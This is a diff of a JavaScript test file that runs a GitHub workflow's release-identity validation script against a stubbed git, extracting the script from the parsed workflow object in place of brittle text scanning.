+// A shell pattern can only be trusted by running it: the committed `[0-9a-f]*` check accepted "a"
+// followed by 39 uppercase Zs, and no text assertion saw it. The script is taken from the PARSED
+// object — the same string GitHub would execute — and run under a stubbed git.
 
-function identityScript(text) {
-  const anchor = text.indexOf('- name: Validate release identity');
-  assert.ok(anchor > 0, 'the identity step exists');
-  const runIdx = text.indexOf('        run: |', anchor);
-  assert.ok(runIdx > 0, 'the identity step has a run block');
-  const after = text.slice(text.indexOf('\n', runIdx) + 1);
-  const lines = [];
-  for (const line of after.split('\n')) {
-    if (line.trim() === '') {
-      lines.push('');
-      continue;
-    }
-    if (!line.startsWith('          ')) break;
-    lines.push(line.slice(10));
-  }
-  return lines.join('\n');
+function identityScript() {
+  const { wf } = parseWorkflow(raw);
+  const step = wf.jobs['global-preflight'].steps.find((s) => s.name === 'Validate release identity');
+  assert.ok(step && typeof step.run === 'string', 'the identity step exists in the parsed object');
+  return step.run;
 }
 
-/**
- * Run the extracted script with a stub `git` whose behaviour is driven by env vars, recording every
- * invocation. The stub is the seam: object type, resolution and ancestry each become controllable.
- */
 function runIdentity({ sha, type = 'commit', resolved = '', ancestorExit = 0 }) {
-  const script = identityScript(raw);
+  const script = identityScript();
   const dir = fs.mkdtempSync(join(os.tmpdir(), 'cba-identity-'));
   try {
     const calls = join(dir, 'calls.log');
@@ -686,10 +630,10 @@ function runIdentity({ sha, type = 'commit', resolved = '', ancestorExit = 0 }) 
         '  fetch) exit 0 ;;',
         '  cat-file)',
         '    if [ "$GIT_TYPE" = "missing" ]; then exit 128; fi',
-        '    printf \'%s\\n\' "$GIT_TYPE" ;;',
+        "    printf '%s\\n' \"$GIT_TYPE\" ;;",
         '  rev-parse)',
-        '    oid=$(printf \'%s\' "$last" | sed \'s/\\^{commit}$//\')',
-        '    if [ -n "$GIT_RESOLVED" ]; then printf \'%s\\n\' "$GIT_RESOLVED"; else printf \'%s\\n\' "$oid"; fi ;;',
+        "    oid=$(printf '%s' \"$last\" | sed 's/\\^{commit}$//')",
+        "    if [ -n \"$GIT_RESOLVED\" ]; then printf '%s\\n' \"$GIT_RESOLVED\"; else printf '%s\\n' \"$oid\"; fi ;;",
         '  merge-base) exit "$GIT_ANCESTOR_EXIT" ;;',
         '  *) exit 1 ;;',
         'esac',
